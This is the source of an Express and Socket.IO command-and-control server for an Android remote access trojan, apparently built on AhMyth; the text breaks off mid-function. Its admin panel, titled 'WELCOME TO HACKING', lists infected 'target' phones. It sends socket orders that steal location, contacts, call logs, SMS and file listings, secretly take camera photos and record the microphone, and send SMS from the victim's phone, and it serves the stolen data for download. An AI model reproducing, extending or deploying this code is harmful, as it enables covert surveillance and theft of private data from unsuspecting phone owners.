const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cookieParser = require('cookie-parser');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);

// Socket.IO configuration
const io = socketIo(server, {
    pingTimeout: 120000,   // 2 minutes
    pingInterval: 10000,   // 10 seconds
    transports: ['websocket', 'polling']
});

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'ADMIN';
const AUTH_COOKIE = 'ahmyth_admin_auth';
const SECRET_TOKEN = crypto.createHash('sha256').update(ADMIN_PASSWORD + '_secret_salt').digest('hex');

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(cookieParser());

// Persistent Stores
const devicesMap = new Map();
const deviceTimeouts = new Map();
const deviceDataStore = new Map(); // Store fetched results for each device
const deviceLogs = [];

let lastAdminActivity = Date.now();
const INACTIVITY_SLEEP_TIMEOUT = 10 * 60 * 1000; // 10 Minutes

function touchAdminActivity() {
    lastAdminActivity = Date.now();
}

function isAdminActive() {
    return (Date.now() - lastAdminActivity) < INACTIVITY_SLEEP_TIMEOUT;
}

// Background Keep-Alive Interval (Runs every 5 seconds)
setInterval(() => {
    if (isAdminActive()) {
        io.emit('ping');
    }
}, 5000);

function addLog(msg, type = 'info') {
    const logItem = {
        time: new Date().toLocaleTimeString(),
        date: new Date().toLocaleDateString(),
        msg,
        type
    };
    deviceLogs.unshift(logItem);
    if (deviceLogs.length > 150) deviceLogs.pop();
    io.emit('admin_log', logItem);
}

// Authentication middleware
function requireAuth(req, res, next) {
    if (req.cookies && req.cookies[AUTH_COOKIE] === SECRET_TOKEN) {
        touchAdminActivity();
        return next();
    }
    return res.redirect('/login');
}

// Helper to get or create device data container
function getDeviceStore(deviceKey) {
    if (!deviceDataStore.has(deviceKey)) {
        deviceDataStore.set(deviceKey, {
            location: null,
            contacts: null,
            callLogs: null,
            smsList: null,
            fileList: null,
            photos: [],
            audioRecordings: []
        });
    }
    return deviceDataStore.get(deviceKey);
}

// Convert socket buffer / byte array to base64 data string
function bufferToBase64(buf) {
    if (!buf) return '';
    if (typeof buf === 'string') return buf;
    if (Buffer.isBuffer(buf)) return buf.toString('base64');
    if (Array.isArray(buf) || buf instanceof Uint8Array) {
        return Buffer.from(buf).toString('base64');
    }
    return '';
}

// Admin API Heartbeat
app.get('/api/admin-heartbeat', requireAuth, (req, res) => {
    touchAdminActivity();
    const devicesList = [];
    devicesMap.forEach((dev, key) => {
        devicesList.push({
            key: dev.key,
            id: dev.id,
            model: dev.model,
            manf: dev.manf,
            release: dev.release,
            ip: dev.ip,
            country: dev.country,
            date: dev.date,
            time: dev.time,
            status: dev.status
        });
    });
    res.json({ status: 'active', devices: devicesList });
});

// Background Wake-Up Target API
app.post('/api/wake-target', requireAuth, (req, res) => {
    touchAdminActivity();
    io.emit('ping');
    addLog(`⚡ WAKE SIGNAL: Sent background wake ping to target app.`);
    res.json({ success: true, message: 'Wake ping sent to target app.' });
});

// Download Data Route (.json / .csv / file)
app.get('/admin/download', requireAuth, (req, res) => {
    const { deviceKey, type, index } = req.query;
    const store = getDeviceStore(deviceKey);

    if (type === 'contacts' && store.contacts) {
        res.setHeader('Content-Type', 'application/json');
        res.setHeader('Content-Disposition', `attachment; filename=contacts_${deviceKey}.json`);
        return res.send(JSON.stringify(store.contacts, null, 2));
    }
    if (type === 'callLogs' && store.callLogs) {
        res.setHeader('Content-Type', 'application/json');
        res.setHeader('Content-Disposition', `attachment; filename=call_logs_${deviceKey}.json`);
        return res.send(JSON.stringify(store.callLogs, null, 2));
    }
    if (type === 'sms' && store.smsList) {
        res.setHeader('Content-Type', 'application/json');
        res.setHeader('Content-Disposition', `attachment; filename=sms_${deviceKey}.json`);
        return res.send(JSON.stringify(store.smsList, null, 2));
    }
    if (type === 'photo' && store.photos[index]) {
        const photo = store.photos[index];
        const imgBuffer = Buffer.from(photo.base64, 'base64');
        res.setHeader('Content-Type', 'image/jpeg');
        res.setHeader('Content-Disposition', `attachment; filename=${photo.name || 'photo.jpg'}`);
        return res.send(imgBuffer);
    }
    if (type === 'audio' && store.audioRecordings[index]) {
        const audio = store.audioRecordings[index];
        const audioBuf = Buffer.from(audio.base64, 'base64');
        res.setHeader('Content-Type', 'audio/mp3');
        res.setHeader('Content-Disposition', `attachment; filename=${audio.name || 'audio.mp3'}`);
        return res.send(audioBuf);
    }
    res.status(404).send('Download file not found');
});

// Login Page
app.get('/login', (req, res) => {
    if (req.cookies && req.cookies[AUTH_COOKIE] === SECRET_TOKEN) {
        return res.redirect('/admin');
    }
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>WELCOME TO HACKING - Login</title>
        <style>
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #05050a; color: #00ff88; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
            .login-card { background: #0f111a; padding: 40px; border-radius: 12px; border: 1px solid #00ff88; box-shadow: 0 0 25px rgba(0, 255, 136, 0.2); width: 100%; max-width: 420px; text-align: center; }
            h2 { color: #00ff88; margin-bottom: 25px; font-size: 24px; letter-spacing: 2px; text-transform: uppercase; text-shadow: 0 0 10px rgba(0,255,136,0.5); }
            input[type="password"] { width: 100%; padding: 14px; margin-bottom: 20px; border: 1px solid #00f2fe; border-radius: 6px; background: #05050a; color: #fff; font-size: 16px; outline: none; }
            input[type="password"]:focus { border-color: #00ff88; box-shadow: 0 0 10px rgba(0, 255, 136, 0.5); }
            button { width: 100%; padding: 14px; background: #00ff88; color: #05050a; font-size: 16px; font-weight: bold; border: none; border-radius: 6px; cursor: pointer; transition: 0.3s; letter-spacing: 1px; }
            button:hover { background: #00f2fe; color: #000; box-shadow: 0 0 15px rgba(0, 242, 254, 0.6); }
            .error { color: #ff4d4d; margin-bottom: 15px; font-size: 14px; font-weight: bold; }
        </style>
    </head>
    <body>
        <div class="login-card">
            <h2>WELCOME TO HACKING</h2>
            ${req.query.error ? '<div class="error">❌ ACCESS DENIED! Wrong Password.</div>' : ''}
            <form action="/login" method="POST">
                <input type="password" name="password" placeholder="Enter Admin Password" required autofocus>
                <button type="submit">LOGIN TO DASHBOARD</button>
            </form>
        </div>
    </body>
    </html>
    `);
});

// Process Login
app.post('/login', (req, res) => {
    const { password } = req.body;
    if (password === ADMIN_PASSWORD) {
        touchAdminActivity();
        res.cookie(AUTH_COOKIE, SECRET_TOKEN, { httpOnly: true, maxAge: 86400000 * 7 });
        return res.redirect('/admin');
    }
    res.redirect('/login?error=1');
});

// Logout
app.get('/logout', (req, res) => {
    res.clearCookie(AUTH_COOKIE);
    res.redirect('/login');
});

// Redirect root to /admin
app.get('/', (req, res) => {
    res.redirect('/admin');
});

// Admin Panel Dashboard (Protected)
app.get('/admin', requireAuth, (req, res) => {
    touchAdminActivity();
    const selectedDeviceId = req.query.selected || '';
    let selectedDevice = null;
    let selectedStore = null;

    let tableRowsHtml = '';
    
    if (devicesMap.size === 0) {
        tableRowsHtml = `
        <tr id="no-device-row">
            <td colspan="6" style="text-align:center; color:#888; padding:20px;">
                No target device registered yet. Launch APK on target phone.
            </td>
        </tr>`;
    } else {
        devicesMap.forEach((device, key) => {
            const isSelected = selectedDeviceId === key;
            if (isSelected) {
                selectedDevice = device;
                selectedStore = getDeviceStore(key);
            }

            const statusBadge = device.status === 'ONLINE' 
                ? `<span class="badge-status" id="status-${key}" style="background:rgba(0,255,136,0.2); color:#00ff88; border:1px solid #00ff88; padding:4px 10px; border-radius:12px; font-weight:bold; font-size:12px;">ONLINE ✅</span>`
                : `<span class="badge-status" id="status-${key}" style="background:rgba(255,77,77,0.2); color:#ff4d4d; border:1px solid #ff4d4d; padding:4px 10px; border-radius:12px; font-weight:bold; font-size:12px;">OFFLINE 💤</span>`;

            tableRowsHtml += `
            <tr style="border-bottom: 1px solid #1a2238; background: ${isSelected ? 'rgba(0, 242, 254, 0.1)' : 'transparent'};">
                <td style="padding:14px;">${device.date} ${device.time}</td>
                <td style="padding:14px;"><span style="font-size:16px;">🇮🇳</span> ${device.country || 'India'}</td>
                <td style="padding:14px;">
                    <a href="/admin?selected=${key}" style="color:#00f2fe; font-weight:bold; text-decoration:none; font-size:15px; border-bottom:1px dashed #00f2fe; padding-bottom:2px;">
                        📱 ${device.model} (${device.manf})
                    </a>
                </td>
                <td style="padding:14px; font-family:monospace; color:#aaa;">${device.ip}</td>
                <td style="padding:14px;">${statusBadge}</td>
                <td style="padding:14px; text-align:right;">
                    <button onclick="wakeTargetApp()" style="background:#00f2fe; color:#000; padding:6px 14px; border-radius:6px; font-weight:bold; font-size:12px; border:none; cursor:pointer; transition:0.2s;">
                        ⚡ WAKE APP
                    </button>
                </td>
            </tr>`;
        });
    }

    // Selected Device Control Panel View
    let controlPanelView = '';
    if (selectedDevice && selectedStore) {
        
        // 1. Location Result HTML
        let locationResultHtml = '';
        if (selectedStore.location) {
            if (selectedStore.location.enable) {
                const lat = selectedStore.location.lat;
                const lng = selectedStore.location.lng;
                locationResultHtml = `
                <div style="background:#0a1208; border:1px solid #00ff88; padding:12px; border-radius:6px; margin-top:10px;">
                    <p style="color:#00ff88; font-size:13px; font-weight:bold;">✅ Location Fetched!</p>
                    <p style="font-size:12px; color:#fff;">Latitude: <code>${lat}</code> | Longitude: <code>${lng}</code></p>
                    <a href="https://maps.google.com/?q=${lat},${lng}" target="_blank" style="display:inline-block; margin-top:6px; color:#00f2fe; font-size:12px; font-weight:bold;">🗺️ Open in Google Maps</a>
                </div>`;
            } else {
                locationResultHtml = `
                <div style="background:#1a0808; border:1px solid #ff4d4d; padding:12px; border-radius:6px; margin-top:10px;">
                    <p style="color:#ff4d4d; font-size:13px; font-weight:bold;">❌ GPS is OFF on Target Phone</p>
                </div>`;
            }
        }

        // 2. Contacts Result HTML
        let contactsResultHtml = '';
        if (selectedStore.contacts && Array.isArray(selectedStore.contacts)) {
            const count = selectedStore.contacts.length;
            let rows = selectedStore.contacts.slice(0, 50).map(c => `
                <tr style="border-bottom:1px solid #222;">
                    <td style="padding:6px;">${c.name || 'No Name'}</td>
                    <td style="padding:6px; color:#00f2fe;">${c.phoneNo || c.number || ''}</td>
                </tr>
            `).join('');

            contactsResultHtml = `
            <div style="background:#08101a; border:1px solid #00f2fe; padding:12px; border-radius:6px; margin-top:10px; max-height:220px; overflow-y:auto;">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
                    <span style="color:#00f2fe; font-size:13px; font-weight:bold;">📊 Total Contacts: ${count}</span>
                    <a href="/admin/download?deviceKey=${selectedDevice.key}&type=contacts" style="background:#00f2fe; color:#000; padding:4px 8px; border-radius:4px; font-size:11px; font-weight:bold; text-decoration:none;">📥 Download JSON</a>
                </div>
                <table style="width:100%; font-size:12px;">
                    <thead><tr style="color:#888;"><th>Name</th><th>Phone Number</th></tr></thead>
                    <tbody>${rows}</tbody>
                </table>
            </div>`;
        }

        // 3. Call Logs Result HTML
        let callLogsResultHtml = '';
        if (selectedStore.callLogs && Array.isArray(selectedStore.callLogs)) {
            const count = selectedStore.callLogs.length;
            let rows = selectedStore.callLogs.slice(0, 50).map(c => `
                <tr style="border-bottom:1px solid #222;">
                    <td style="padding:6px;">${c.name || c.phoneNo || c.number || ''}</td>
                    <td style="padding:6px; color:#ffbb00;">${c.type || 'Call'}</td>
                    <td style="padding:6px; color:#aaa;">${c.duration || '0'}s</td>
                </tr>
            `).join('');

            callLogsResultHtml = `
            <div style="background:#141208; border:1px solid #ffbb00; padding:12px; border-radius:6px; margin-top:10px; max-height:220px; overflow-y:auto;">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
                    <span style="color:#ffbb00; font-size:13px; font-weight:bold;">📞 Total Call History: ${count}</span>
                    <a href="/admin/download?deviceKey=${selectedDevice.key}&type=callLogs" style="background:#ffbb00; color:#000; padding:4px 8px; border-radius:4px; font-size:11px; font-weight:bold; text-decoration:none;">📥 Download JSON</a>
                </div>
                <table style="width:100%; font-size:12px;">
                    <thead><tr style="color:#888;"><th>Contact / Number</th><th>Type</th><th>Duration</th></tr></thead>
                    <tbody>${rows}</tbody>
                </table>
            </div>`;
        }

        // 4. SMS Inbox Result HTML
        let smsResultHtml = '';
        if (selectedStore.smsList && Array.isArray(selectedStore.smsList)) {
            const count = selectedStore.smsList.length;
            let rows = selectedStore.smsList.slice(0, 50).map(s => `
                <tr style="border-bottom:1px solid #222;">
                    <td style="padding:6px; color:#ff0077; font-weight:bold;">${s.address || s.phoneNo || ''}</td>
                    <td style="padding:6px; color:#fff;">${s.body || s.msg || ''}</td>
                </tr>
            `).join('');

            smsResultHtml = `
            <div style="background:#140810; border:1px solid #ff0077; padding:12px; border-radius:6px; margin-top:10px; max-height:220px; overflow-y:auto;">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
                    <span style="color:#ff0077; font-size:13px; font-weight:bold;">💬 Total Messages: ${count}</span>
                    <a href="/admin/download?deviceKey=${selectedDevice.key}&type=sms" style="background:#ff0077; color:#fff; padding:4px 8px; border-radius:4px; font-size:11px; font-weight:bold; text-decoration:none;">📥 Download JSON</a>
                </div>
                <table style="width:100%; font-size:12px;">
                    <thead><tr style="color:#888;"><th>Sender / Number</th><th>Message Text</th></tr></thead>
                    <tbody>${rows}</tbody>
                </table>
            </div>`;
        }

        // 5. File Manager Result HTML
        let fileResultHtml = '';
        if (selectedStore.fileList && Array.isArray(selectedStore.fileList)) {
            let rows = selectedStore.fileList.map(f => `
                <tr style="border-bottom:1px solid #222;">
                    <td style="padding:6px;">${f.isDir ? '📁' : '📄'} ${f.name}</td>
                    <td style="padding:6px; color:#aaa;">${f.size || (f.isDir ? 'Folder' : 'File')}</td>
                </tr>
            `).join('');

            fileResultHtml = `
            <div style="background:#10081a; border:1px solid #9900ff; padding:12px; border-radius:6px; margin-top:10px; max-height:220px; overflow-y:auto;">
                <p style="color:#9900ff; font-size:12px; font-weight:bold; margin-bottom:6px;">Files & Directories (${selectedStore.fileList.length}):</p>
                <table style="width:100%; font-size:12px;">
                    <thead><tr style="color:#888;"><th>Name</th><th>Size</th></tr></thead>
                    <tbody>${rows}</tbody>
                </table>
            </div>`;
        }

        // 6. Photos Gallery Result HTML
        let photosResultHtml = '';
        if (selectedStore.photos.length > 0) {
            let photoCards = selectedStore.photos.map((p, idx) => `
                <div style="text-align:center; background:#080b14; padding:8px; border-radius:6px; border:1px solid #00f2fe;">
                    <img src="data:image/jpeg;base64,${p.base64}" style="width:100%; max-width:200px; border-radius:4px; margin-bottom:6px;">
                    <br>
                    <a href="/admin/download?deviceKey=${selectedDevice.key}&type=photo&index=${idx}" style="background:#00f2fe; color:#000; padding:4px 8px; border-radius:4px; font-size:11px; font-weight:bold; text-decoration:none; display:inline-block;">📥 Download Photo</a>
                </div>
            `).join('');

            photosResultHtml = `
            <div style="background:#081014; border:1px solid #00f2fe; padding:12px; border-radius:6px; margin-top:10px;">
                <p style="color:#00f2fe; font-size:13px; font-weight:bold; margin-bottom:8px;">📷 Captured Photos (${selectedStore.photos.length}):</p>
                <div style="display:flex; gap:10px; flex-wrap:wrap;">${photoCards}</div>
            </div>`;
        }

        // 7. Audio Recordings Result HTML
        let audioResultHtml = '';
        if (selectedStore.audioRecordings.length > 0) {
            let audioCards = selectedStore.audioRecordings.map((a, idx) => `
                <div style="background:#140808; padding:10px; border-radius:6px; border:1px solid #ff4d4d; margin-bottom:8px;">
                    <p style="color:#ff4d4d; font-size:12px; font-weight:bold; margin-bottom:4px;">🎙️ Recording #${idx+1} (${a.name || 'audio.mp3'}):</p>
                    <audio controls src="data:audio/mp3;base64,${a.base64}" style="width:100%; margin-bottom:6px;"></audio>
                    <a href="/admin/download?deviceKey=${selectedDevice.key}&type=audio&index=${idx}" style="background:#ff4d4d; color:#fff; padding:4px 8px; border-radius:4px; font-size:11px; font-weight:bold; text-decoration:none; display:inline-block;">📥 Download Audio</a>
                </div>
            `).join('');

            audioResultHtml = `
            <div style="background:#140808; border:1px solid #ff4d4d; padding:12px; border-radius:6px; margin-top:10px;">
                ${audioCards}
            </div>`;
        }

        controlPanelView = `
        <div style="background: #0d111e; border: 1px solid #00f2fe; border-radius: 12px; padding: 25px; margin-top: 30px; box-shadow: 0 0 20px rgba(0,242,254,0.15);">
            <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #1a2540; padding-bottom:15px; margin-bottom:20px;">
                <div>
                    <h2 style="color:#00f2fe; margin-bottom:5px;">📱 CONTROL PANEL FOR: <span style="color:#fff;">${selectedDevice.model} (${selectedDevice.manf})</span></h2>
                    <p style="color:#aaa; font-size:13px;"><strong>Device ID:</strong> ${selectedDevice.id} | <strong>Android:</strong> ${selectedDevice.release} | <strong>IP:</strong> ${selectedDevice.ip}</p>
                </div>
                <a href="/admin" style="background:#ff4d4d; color:#fff; padding:6px 12px; border-radius:6px; text-decoration:none; font-weight:bold; font-size:12px;">✖ CLOSE PANEL</a>
            </div>

            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px;">
                
                <!-- Location -->
                <div style="background:#141a2e; border:1px solid #00ff88; padding:18px; border-radius:8px;">
                    <h3 style="color:#00ff88; margin-bottom:10px;">📍 Location Tracker</h3>
                    <p style="color:#aaa; font-size:12px; margin-bottom:12px;">Fetch GPS / Network Location.</p>
                    <form action="/admin/send-order" method="POST">
                        <input type="hidden" name="socketId" value="${selectedDevice.socketId}">
                        <input type="hidden" name="selected" value="${selectedDevice.key}">
                        <input type="hidden" name="order" value="x0000lm">
                        <button type="submit" style="width:100%; padding:10px; background:#00ff88; color:#000; font-weight:bold; border:none; border-radius:6px; cursor:pointer;">GET LOCATION</button>
                    </form>
                    ${locationResultHtml}
                </div>

                <!-- Contacts -->
                <div style="background:#141a2e; border:1px solid #00f2fe; padding:18px; border-radius:8px;">
                    <h3 style="color:#00f2fe; margin-bottom:10px;">👤 Contacts Fetcher</h3>
                    <p style="color:#aaa; font-size:12px; margin-bottom:12px;">Download all phone contacts.</p>
                    <form action="/admin/send-order" method="POST">
                        <input type="hidden" name="socketId" value="${selectedDevice.socketId}">
                        <input type="hidden" name="selected" value="${selectedDevice.key}">
                        <input type="hidden" name="order" value="x0000cn">
                        <button type="submit" style="width:100%; padding:10px; background:#00f2fe; color:#000; font-weight:bold; border:none; border-radius:6px; cursor:pointer;">FETCH ALL CONTACTS</button>
                    </form>
                    ${contactsResultHtml}
                </div>

                <!-- Call Logs -->
                <div style="background:#141a2e; border:1px solid #ffbb00; padding:18px; border-radius:8px;">
                    <h3 style="color:#ffbb00; margin-bottom:10px;">📞 Call History</h3>
                    <p style="color:#aaa; font-size:12px; margin-bottom:12px;">Extract incoming & outgoing call history.</p>
                    <form action="/admin/send-order" method="POST">
                        <input type="hidden" name="socketId" value="${selectedDevice.socketId}">
                        <input type="hidden" name="selected" value="${selectedDevice.key}">
                        <input type="hidden" name="order" value="x0000cl">
                        <button type="submit" style="width:100%; padding:10px; background:#ffbb00; color:#000; font-weight:bold; border:none; border-radius:6px; cursor:pointer;">GET CALL HISTORY</button>
                    </form>
                    ${callLogsResultHtml}
                </div>

                <!-- SMS Manager -->
                <div style="background:#141a2e; border:1px solid #ff0077; padding:18px; border-radius:8px;">
                    <h3 style="color:#ff0077; margin-bottom:10px;">💬 SMS Manager</h3>
                    <p style="color:#aaa; font-size:12px; margin-bottom:10px;">Fetch inbox messages or send SMS.</p>
                    <form action="/admin/send-order" method="POST" style="margin-bottom:8px;">
                        <input type="hidden" name="socketId" value="${selectedDevice.socketId}">
                        <input type="hidden" name="selected" value="${selectedDevice.key}">
                        <input type="hidden" name="order" value="x0000sm_ls">
                        <button type="submit" style="width:100%; padding:8px; background:#ff0077; color:#fff; font-weight:bold; border:none; border-radius:6px; cursor:pointer;">FETCH SMS INBOX</button>
                    </form>
                    <form action="/admin/send-order" method="POST" style="display:flex; flex-direction:column; gap:6px;">
                        <input type="hidden" name="socketId" value="${selectedDevice.socketId}">
                        <input type="hidden" name="selected" value="${selectedDevice.key}">
                        <input type="hidden" name="order" value="x0000sm_send">
                        <input type="text" name="to" placeholder="Phone Number" required style="padding:6px; background:#080b14; color:#fff; border:1px solid #444; border-radius:4px;">
                        <input type="text" name="sms" placeholder="Message Text" required style="padding:6px; background:#080b14; color:#fff; border:1px solid #444; border-radius:4px;">
                        <button type="submit" style="padding:8px; background:#444; color:#fff; font-weight:bold; border:none; border-radius:4px; cursor:pointer;">SEND SMS FROM PHONE</button>
                    </form>
                    ${smsResultHtml}
                </div>

                <!-- File Manager -->
                <div style="background:#141a2e; border:1px solid #9900ff; padding:18px; border-radius:8px;">
                    <h3 style="color:#9900ff; margin-bottom:10px;">📁 File Manager</h3>
                    <p style="color:#aaa; font-size:12px; margin-bottom:10px;">Browse storage files / SD Card.</p>
                    <form action="/admin/send-order" method="POST" style="display:flex; gap:6px;">
                        <input type="hidden" name="socketId" value="${selectedDevice.socketId}">
                        <input type="hidden" name="selected" value="${selectedDevice.key}">
                        <input type="hidden" name="order" value="x0000fm_ls">
                        <input type="text" name="extra" placeholder="Path (default /)" value="/" style="padding:8px; background:#080b14; color:#fff; border:1px solid #444; border-radius:4px; flex:1;">
                        <button type="submit" style="padding:8px 14px; background:#9900ff; color:#fff; font-weight:bold; border:none; border-radius:4px; cursor:pointer;">BROWSE</button>
                    </form>
                    ${fileResultHtml}
                </div>

                <!-- Camera -->
                <div style="background:#141a2e; border:1px solid #00f2fe; padding:18px; border-radius:8px;">
                    <h3 style="color:#00f2fe; margin-bottom:10px;">📷 Camera Capture</h3>
                    <p style="color:#aaa; font-size:12px; margin-bottom:10px;">Select camera and capture photo.</p>
                    <form action="/admin/send-order" method="POST" style="display:flex; flex-direction:column; gap:8px;">
                        <input type="hidden" name="socketId" value="${selectedDevice.socketId}">
                        <input type="hidden" name="selected" value="${selectedDevice.key}">
                        <input type="hidden" name="order" value="x0000ca">
                        <select name="extra" style="padding:8px; background:#080b14; color:#fff; border:1px solid #00f2fe; border-radius:4px;">
                            <option value="1">📷 Front Camera (Cam 1)</option>
                            <option value="0">📸 Back Camera (Cam 0)</option>
                        </select>
                        <button type="submit" style="padding:10px; background:#00f2fe; color:#000; font-weight:bold; border:none; border-radius:6px; cursor:pointer;">📸 CAPTURE PHOTO</button>
                    </form>
                    ${photosResultHtml}
                </div>

                <!-- Microphone -->
                <div style="background:#141a2e; border:1px solid #ff4d4d; padding:18px; border-radius:8px;">
                    <h3 style="color:#ff4d4d; margin-bottom:10px;">🎙️ Audio Recorder</h3>
                    <p style="color:#aaa; font-size:12px; margin-bottom:10px;">Record mic audio & play directly on screen.</p>
                    <form action="/admin/send-order" method="POST" style="display:flex; gap:6px;">
                        <input type="hidden" name="socketId" value="${selectedDevice.socketId}">
                        <input type="hidden" name="selected" value="${selectedDevice.key}">
                        <input type="hidden" name="order" value="x0000mc">
                        <input type="number" name="extra" placeholder="Seconds" value="10" style="padding:8px; background:#080b14; color:#fff; border:1px solid #444; border-radius:4px; width:100px;">
                        <button type="submit" style="padding:8px 14px; background:#ff4d4d; color:#fff; font-weight:bold; border:none; border-radius:4px; flex:1; cursor:pointer;">🎙️ RECORD MIC</button>
                    </form>
                    ${audioResultHtml}
                </div>

            </div>
        </div>`;
    }

    let logsHtml = deviceLogs.map(l => `<div style="margin-bottom:4px;"><span style="color:#666;">[${l.time}]</span> <span style="color:#00ff88;">${l.msg}</span></div>`).join('');

    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>WELCOME TO HACKING - Admin Dashboard</title>
        <style>
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #05050a; color: #d0d0d0; padding: 25px; }
            .container { max-width: 1200px; margin: 0 auto; }
            
            /* Main Header */
            header { display: flex; justify-content: space-between; align-items: center; position: relative; padding-bottom: 20px; margin-bottom: 30px; border-bottom: 2px solid #00ff88; }
            .header-title { position: absolute; left: 50%; transform: translateX(-50%); font-size: 28px; font-weight: 900; color: #00ff88; letter-spacing: 3px; text-transform: uppercase; text-shadow: 0 0 15px rgba(0, 255, 136, 0.6); }
            .logout-btn { padding: 10px 20px; background: #ff4d4d; color: #fff; text-decoration: none; font-weight: bold; border-radius: 6px; margin-left: auto; transition:0.3s; }
            .logout-btn:hover { background: #ff1a1a; box-shadow: 0 0 10px rgba(255,77,77,0.5); }
            
            /* Card Section */
            .card { background: #0d111e; border-radius: 12px; border: 1px solid #1a2540; padding: 25px; margin-bottom: 25px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
            .card h2 { color: #00f2fe; margin-bottom: 15px; font-size: 20px; letter-spacing: 1px; }

            /* Metadata Table */
            .table-responsive { width: 100%; overflow-x: auto; }
            table { width: 100%; border-collapse: collapse; text-align: left; }
            th { background: #12182b; color: #00ff88; padding: 14px; font-size: 13px; text-transform: uppercase; letter-spacing: 1px; border-bottom: 2px solid #00ff88; }
            
            /* Terminal Logs */
            .logs-box { background: #000; color: #00ff88; padding: 18px; border-radius: 8px; height: 260px; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 13px; border: 1px solid #1f2d4d; }
        </style>
        <script src="/socket.io/socket.io.js"></script>
        <script>
            var socket = io();

            function wakeTargetApp() {
                fetch('/api/wake-target', { method: 'POST' })
                .then(function(r){ return r.json(); })
                .then(function(data){ console.log('Wake signal sent!'); })
                .catch(function(e){});
            }

            setInterval(function() {
                fetch('/api/admin-heartbeat').then(r => r.json()).then(data => {
                    if (data.devices) {
                        data.devices.forEach(dev => {
                            var statusElem = document.getElementById('status-' + dev.key);
                            if (statusElem) {
                                if (dev.status === 'ONLINE') {
                                    statusElem.style.background = 'rgba(0,255,136,0.2)';
                                    statusElem.style.color = '#00ff88';
                                    statusElem.style.border = '1px solid #00ff88';
                                    statusElem.innerHTML = 'ONLINE ✅';
                                } else {
                                    statusElem.style.background = 'rgba(255,77,77,0.2)';
                                    statusElem.style.color = '#ff4d4d';
                                    statusElem.style.border = '1px solid #ff4d4d';
                                    statusElem.innerHTML = 'OFFLINE 💤';
                                }
                            }
                        });
                    }
                }).catch(function(e){});
            }, 3000);

            socket.on('admin_log', function(log) {
                var logsBox = document.getElementById('logsBox');
                if (logsBox) {
                    var newLog = document.createElement('div');
                    newLog.style.marginBottom = '4px';
                    newLog.innerHTML = '<span style="color:#666;">[' + log.time + ']</span> <span style="color:#00ff88;">' + log.msg + '</span>';
                    logsBox.insertBefore(newLog, logsBox.firstChild);
                }
            });

            // Reload page smoothly on new data arrival to display fetched cards/tables
            socket.on('data_arrived', function() {
                window.location.reload();
            });
        </script>
    </head>
    <body>
        <div class="container">
            <header>
                <div style="font-size: 14px; color: #aaa;">Status: <span style="color:#00ff88; font-weight:bold;">ONLINE ✅</span></div>
                <div class="header-title">WELCOME TO HACKING</div>
                <a href="/logout" class="logout-btn">LOGOUT 🔒</a>
            </header>

            <!-- Metadata Table -->
            <div class="card">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
                    <h2 style="margin:0;">📲 DEVICE METADATA & CONTROL (Click Model Name to Open Features)</h2>
                    <button onclick="wakeTargetApp()" style="background:#00f2fe; color:#000; padding:6px 14px; border-radius:6px; font-weight:bold; font-size:12px; border:none; cursor:pointer;">⚡ WAKE ALL TARGET APPS</button>
                </div>
                <div class="table-responsive">
                    <table>
                        <thead>
                            <tr>
                                <th>DATE</th>
                                <th>COUNTRY</th>
                                <th>MODEL</th>
                                <th>IP ADDRESS</th>
                                <th>STATUS</th>
                                <th style="text-align:right;">ACTION</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${tableRowsHtml}
                        </tbody>
                    </table>
                </div>
            </div>

            <!-- Selected Device Feature View -->
            ${controlPanelView}

            <!-- Realtime Logs -->
            <div class="card" style="margin-top:30px;">
                <h2 style="margin-bottom:15px;">📋 LIVE ACTIVITY LOGS</h2>
                <div class="logs-box" id="logsBox">
                    ${logsHtml || '<div>Waiting for incoming target device activity...</div>'}
                </div>
            </div>
        </div>
    </body>
    </html>
    `);
});

// Admin order handler
app.post('/admin/send-order', requireAuth, (req, res) => {
    touchAdminActivity();
    const { socketId, selected, order, extra, to, sms } = req.body;
    
    // Find target socket
    let socket = null;
    let targetDeviceKey = selected;

    if (socketId && io.sockets.connected) {
        socket = io.sockets.connected[socketId] || io.sockets.sockets[socketId];
    }
    
    if (!socket && selected) {
        const deviceObj = devicesMap.get(selected);
        if (deviceObj && deviceObj.status === 'ONLINE') {
            socket = io.sockets.connected ? io.sockets.connected[deviceObj.socketId] : io.sockets.sockets[deviceObj.socketId];
        }
    }

    if (!socket) {
        addLog(`❌ Action Failed: Target device is offline or socket disconnected. Click WAKE APP button to wake up target.`, 'error');
        return res.redirect(`/admin${selected ? '?selected=' + selected : ''}`);
    }

    let payload = {};
    if (order === 'x0000lm') {
        payload = { order: 'x0000lm' };
    } else if (order === 'x0000cn') {
        payload = { order: 'x0000cn' };
    } else if (order === 'x0000cl') {
        payload = { order: 'x0000cl' };
    } else if (order === 'x0000sm_ls') {
        payload = { order: 'x0000sm', extra: 'ls' };
    } else if (order === 'x0000sm_send') {
        payload = { order: 'x0000sm', extra: 'sendSMS', to: to, sms: sms };
    } else if (order === 'x0000fm_ls') {
        payload = { order: 'x0000fm', extra: 'ls', path: extra || '/' };
    } else if (order === 'x0000ca_ls' || order === 'x0000ca') {
        payload = { order: 'x0000ca', extra: extra || 'camList' };
    } else if (order === 'x0000mc') {
